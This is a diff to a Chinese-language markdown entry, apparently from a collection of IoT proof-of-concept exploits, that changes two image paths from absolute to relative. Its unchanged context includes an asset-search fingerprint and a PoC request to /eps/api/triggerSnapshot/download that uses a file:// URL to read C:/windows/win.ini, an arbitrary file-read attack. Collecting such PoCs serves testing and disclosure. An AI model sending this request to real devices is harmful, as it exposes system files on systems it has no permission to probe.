@@ -18,7 +18,7 @@ icon_hash="-911494769"
 
 登录页面
 
-![image-20230704110859434](D:\TMP_FILE\awesome-poc\iot\images\image-20230704110859434.png)
+![image-20230704110859434](./images/image-20230704110859434.png)
 
 验证POC， token 为 Url md5
 
@@ -26,4 +26,4 @@ icon_hash="-911494769"
 /eps/api/triggerSnapshot/download?token=xxx&fileUrl=file:///C:/windows/win.ini&fileName=1 
 ```
 
-![image-20230704111021242](D:\TMP_FILE\awesome-poc\iot\images\image-20230704111021242.png)
+![image-20230704111021242](./images/image-20230704111021242.png)
